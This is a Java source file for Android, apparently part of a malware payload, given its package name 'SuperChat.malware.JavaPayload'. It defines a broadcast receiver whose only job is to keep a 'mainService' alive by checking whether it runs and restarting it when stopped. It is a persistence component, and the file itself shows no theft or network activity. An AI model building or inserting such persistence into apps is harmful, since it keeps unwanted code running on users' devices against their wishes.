package com.teamxdevelopers.SuperChat.malware.JavaPayload;

import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

/*
The broadcastReciever class extends BroadcastReceiver and serves as a receiver for various intents.
Its main role is to monitor and manage the state of the mainService service within the application.
 It uses the Android system's ActivityManager service to check if mainService is currently running and starts it if it's not.
 This class is a critical component for ensuring that mainService remains active. It listens for specific broadcast intents
 (the exact intents depend on how it's registered in the manifest or dynamically in code) and ensures that mainService is restarted if it has been stopped for any reason.
 This is particularly useful for maintaining a persistent service that needs to run continuously or be restarted automatically under certain conditions.
 */
public class broadcastReciever extends BroadcastReceiver {

    static String TAG = "broadcastRecieverClass";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i(TAG, "Received...");

        // Check if the service is running
        if(isMyServiceRunning(context)) {
            Log.v(TAG, "Yeah, it's running, no need to restart service");
        }
        else {
            Log.v(TAG, "Not running, restarting service");
            // Intent to start the mainService
            Intent intent1 = new Intent(context, mainService.class);
            context.startService(intent1); // Start the service
        }
    }

    private boolean isMyServiceRunning(Context context) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (mainService.class.getName().equals(service.service.getClassName())) {
                // The service is running
                return true;
            }
        }
        // The service is not running
        return false;
    }
}
